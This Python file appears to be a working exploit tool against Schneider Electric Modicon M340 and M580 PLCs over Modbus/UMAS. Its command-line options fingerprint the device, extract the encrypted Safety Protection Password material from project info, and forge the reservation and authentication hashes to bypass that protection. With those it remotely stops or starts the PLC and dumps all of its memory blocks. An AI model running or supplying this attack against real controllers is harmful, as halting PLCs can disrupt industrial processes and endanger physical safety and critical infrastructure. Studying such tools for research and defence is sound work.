import socket
from scapy.all import Raw
from scapy.contrib.modbus import ModbusADURequest
from scapy.contrib.modbus import ModbusADUResponse
import struct
import os,sys
from hashlib import sha256
import argparse

"""
https://github.com/0xedh/schneider_plc_exploit.git, tested with:
*FWVERSION: 2003
*HWID: 06010101
*DEVICETEXT_LEN: 12
*DEVICETEXT: BMX P34 1000

It also works with m580.

*FWVERSION: 1003
*HWID: 0e0b0102
*DEVICETEXT_LEN: 12
*DEVICETEXT: BME P58 1020

References:
    https://vulners.com/talos/TALOS-2018-0745
    http://lirasenlared.blogspot.com/2017/08/the-unity-umas-protocol-part-ii.html
    https://medium.com/tenable-techblog/examining-crypto-and-bypassing-authentication-in-schneider-electric-plcs-m340-m580-f37cf9f3ff34
"""
def hexdump(bytes_input, width=16):
    current = 0
    end = len(bytes_input)
    result = ""

    while current < end:
        byte_slice = bytes_input[current : current + width]

        # hex section
        for b in byte_slice:
            result += "%02X " % b

        # filler
        for _ in range(width - len(byte_slice)):
            result += " " * 3
        result += " " * 2

        # printable character section
        for b in byte_slice:
            if (b >= 32) and (b < 127):
                result += chr(b)
            else:
                result += "."

        result += "\n"
        current += width

    return result

def send_message(sock, umas, data=None, wait_for_response=True):
    if data == None:
        packet = ModbusADURequest(transId=1)/umas
    else:
        packet = ModbusADURequest(transId=1)/umas/data
    msg = bytes(packet)
    resp = ""
    sock.send(msg)
    if wait_for_response:
        resp = sock.recv(2048)
    return resp
####
mbtcp_fnc = b"\x5a"
read_id = b"\x00\x02"
read_info = "\x00\x03"
project_info = b"\x00\x20\x01\x14\x00\x00\x00\x00\x00\x00\x02"
nonces = b"\x00\x6e\x02\x90\x4d\x00\x00"
status = b"\x00\x04"
reservation = b"\x00\x10\x90\x4d\x00\x00"
u_stop_plc = b"\x41\xff\x00"
u_start_plc = b"\x40\xff\x00"
outfile = "modicon_dump.bin"
####
PLCID_LEN = 4
FWVERSION_LEN = 2
HWID_LEN = 4
PLCID_LEN = 4
DEVICETEXT_LEN = None
FWVERSION = None
HWID = None
PLCID = None
DEVICETEXT = None
####
B64_0_LEN = 12
B64_0 = None
B64_1_LEN = 44
B64_1 = None
####
def dump_all_blocks(s):
    try:
        
        get_idinfo(s)
        with open(outfile, 'wb+') as f:
            print("[*] Writing data to %s" % outfile)
 
        # loop through all possible offsets, writing output to file
        for i in range(0x00, 0x7fff):
            block = struct.pack("<h", i) #h -> 2 bytes, I -> 4 bytes
            #passw:, look struct.pack endianess
            #ret = send_message(s, mbtcp_fnc + "\x00\x20"+ "\x00" + block+ "\xff\x00"+"\x00\x00"+"\xff\x00")
            ret = send_message(s, b"\x5a" + b"\x00\x20"+ b"\x00" + block+ b"\x00\x00"+b"\x00\x00"+b"\xff\x00")
            if len(ret) > 20:
                print("Block: 0x%x" % (i))
                with open(outfile, 'ab') as f:
                    f.write(ret)
                    
                for b in range(0x00,0x7fff,0xff):
                    offset = struct.pack("<h", b) #h -> 2 bytes, I -> 4 bytes
                    ret_b = send_message(s, mbtcp_fnc + b"\x00\x20"+ b"\x00" + block+ offset+ b"\x00\x00"+ b"\xff\x00")
                    with open(outfile, 'ab') as f:
                        f.write(ret_b)
    except Exception as ex:
        print("[!] OOPS: %s" % (ex))

def get_idinfo(s):
    print("[+] Obtaining basic info:")
    try:
        id_info = send_message(s, mbtcp_fnc+read_id)

        ba_id_info = bytearray.fromhex(id_info.hex())
        PLCID = ba_id_info[10:][:PLCID_LEN]
        print("*PLCID: %s" % (PLCID.hex()))
        FWVERSION = ba_id_info[18:][:FWVERSION_LEN]
        print("*FWVERSION: %s" % (FWVERSION.hex()))
        HWID = ba_id_info[24:][:HWID_LEN]
        print("*HWID: %s" % (HWID.hex()))
        DEVICETEXT_LEN = int.from_bytes(ba_id_info[32:][:1], "little") 
        print("*DEVICETEXT_LEN: %i" % (DEVICETEXT_LEN))
        DEVICETEXT = ba_id_info[33:][:DEVICETEXT_LEN] 
        print("*DEVICETEXT: %s" % (DEVICETEXT.decode('utf-8')))
        return [PLCID,FWVERSION,HWID,DEVICETEXT] 
    except Exception as ex:
        print("[!] OOPS: %s" % (ex))

def get_project_info(s):
    print("[+] Obtaining project info (Contains Safety Protection Password crypted):")
    try:
        project_i = send_message(s, mbtcp_fnc+project_info)
        ba_project_i = bytearray.fromhex(project_i.hex())
        #print(project_i.hex())
        print(hexdump(ba_project_i))
        #calculate position of first \x0d\x0a, thats the end of first base64
        try:
            B64_0_POSITION = ba_project_i.index(b'\x0d\x0a')
        except Exception as ex:
            print("[!] No password configured")
            return ["\xDE\xAD\xBE\xEF"]
        B64_0 = ba_project_i[:B64_0_POSITION][-B64_0_LEN:]
        print("*B64_0: %s" % (B64_0.decode('utf-8')))
        #+2 because \x0d\x0a
        B64_1 = ba_project_i[B64_0_POSITION+2:][:B64_1_LEN]
        print("*B64_1: %s" % (B64_1.decode('utf-8')))
        B64_STR = B64_0 + b"\x0d\x0a" + B64_1 + b"\x0d\x0a"
        print("*B64_STR: %s" % (B64_STR.hex()))
        return [B64_STR]
    except Exception as ex:
        print("[!] OOPS: %s" % (ex))
        print("[!] Try dumping memory blocks" % (ex))

def get_nonces(s):
    print("[+] Obtaining nonces:")
    random_client_nonce = bytearray(os.urandom(32))
    print("*CLIENT_NONCE: %s" % (random_client_nonce.hex()))
    try:
        get_nonces = send_message(s, mbtcp_fnc+nonces+random_client_nonce+b"\x00\x00")
        ba_get_nonces = bytearray.fromhex(get_nonces.hex())
        #search for \xfe\xaa\xaa, start of server nonce in response, +3 bytes of \xfe\xaa\xaa
        SERVER_NONCE_POSITION = ba_get_nonces.index(b"\xfe\xaa\xaa")
        SERVER_NONCE = ba_get_nonces[SERVER_NONCE_POSITION+3:]
        print("*SERVER_NONCE: %s" % (SERVER_NONCE.hex()))
        return [SERVER_NONCE,random_client_nonce]

    except Exception as ex:
        print("[!] OOPS: %s" % (ex))
        print("[!] Is someone connected to the PLC? Wait for release.")

def check_status(s):
    print("[+] Checking PLC status:")
    try:
        get_status = send_message(s, mbtcp_fnc+status)
        ba_get_status = bytearray.fromhex(get_status.hex())
        #byte 70 of response, 01 stopped, 02 running
        CURRENT_STATUS = ba_get_status[70]
        if CURRENT_STATUS == 2:
            print("[!] PLC IS RUNNING.")
        else:
            print("[!] PLC IS STOPPED.")
    except Exception as ex:
        print("[!] OOPS: %s" % (ex))

def make_reservation(s,s_nonce,c_nonce,b64_str,auth=True):
        
    print("[+] Making reservation:")
    #DESKTOP-MHC7QK2
    CLIENT_NAME = b"\x44\x45\x53\x4b\x54\x4f\x50\x2d\x4d\x48\x43\x37\x51\x4b\x32"
    try:
        if auth == False:
            #\x0f is data size
            get_reservation = send_message(s, mbtcp_fnc+reservation+b"\x0f"+CLIENT_NAME)
        else:
            RESERVATION_HASH = sha256(s_nonce + b64_str + c_nonce).hexdigest()
            print("[!] Calculated reservation hash: %s" % (RESERVATION_HASH))
            #\x50 is data size
            get_reservation = send_message(s, mbtcp_fnc+reservation+b"\x50"+CLIENT_NAME+b"\x00"+bytearray.fromhex(RESERVATION_HASH.encode("utf-8").hex()))
        ba_get_reservation = bytearray.fromhex(get_reservation.hex())
        print(ba_get_reservation.hex())
        if len(ba_get_reservation) == 11:
            print("[+] Reservation successfull.")
        else:
            print("[W] Something went wrong.")
        CHECK_BYTE = ba_get_reservation[-1:]
        print("*CHECK_BYTE: %s" % (CHECK_BYTE.hex()))
        return [CHECK_BYTE]
    except Exception as ex:
        print("[!] OOPS: %s" % (ex))

def calculate_auth_hashes(HWID,s_nonce,c_nonce,to_send):
    auth_hash_pre = sha256(HWID + c_nonce).digest()
    auth_hash_post = sha256(HWID + s_nonce).digest()
    auth_hash = (sha256(auth_hash_pre + to_send + auth_hash_post).digest())
    return auth_hash
def post_auth_plc(s,check_byte,HWID,s_nonce,c_nonce,command,auth=True):
    if command == "stop_plc":
        print("[+] Stopping PLC.")
        command = u_stop_plc
    if command == "start_plc":
        print("[+] Starting PLC.")
        command = u_start_plc
    to_send = mbtcp_fnc + check_byte + command
    auth_hash = calculate_auth_hashes(HWID,s_nonce,c_nonce,to_send)
    command_plc_pkt = (mbtcp_fnc + check_byte + b"\x38\x01" + auth_hash + to_send)
    if auth == True:
        get_command_plc = send_message(s, command_plc_pkt)
    else:
        get_command_plc = send_message(s, to_send)
    print(get_command_plc.hex())
    if len(get_command_plc) == 46 or len(get_command_plc) == 10:
        print("[*] IT WORKS")
    else:
        print("[W] Something went wrong. Check --noauth. Is someone connected to the PLC?")


def main():

    parser = argparse.ArgumentParser()
    parser.add_argument(dest="target", type=str,help="IP address of target PLC.", default=None)
    parser.add_argument("-na","--noauth",help="Use when Safety Protection Password is not set.", action="store_true", default=False)
    parser.add_argument("-r", "--runplc", type=str, help="Start and stop PLC, with or without Safety Protection.",choices=["start_plc","stop_plc"],required=False)
    parser.add_argument("-c","--check",help="Check PLC status.", action="store_true", default=False)
    parser.add_argument("-i","--info",help="Retrieve PLC information.", action="store_true", default=False)
    parser.add_argument("-p","--project",help="Retrieve PLC project information.", action="store_true", default=False)
    parser.add_argument("-d","--dump",help="Dump all PLC blocks to file.", action="store_true", default=False)

    if len(sys.argv) <= 2:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()
    try:

        rhost = args.target
        rport = 502
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((rhost, rport))
    except socket.timeout:
        print ("Socket timed out.")

    auth = True
    if args.noauth:
        auth = False
    if args.check:
        check_status(s)
    if args.info:
        get_idinfo(s)
    if args.project:
        get_project_info(s)
    if args.runplc:
        idinfo = get_idinfo(s)
        b64_str = get_project_info(s)
        nonceinfo = get_nonces(s)
        check_byte = make_reservation(s,nonceinfo[0],nonceinfo[1],b64_str[0],auth)
        print(args.runplc)
        post_auth_plc(s,check_byte[0],idinfo[2],nonceinfo[0],nonceinfo[1],args.runplc,auth)
    if args.dump:
        dump_all_blocks(s)

    # cleanup
    s.close()
 
if __name__ == '__main__':
    main()
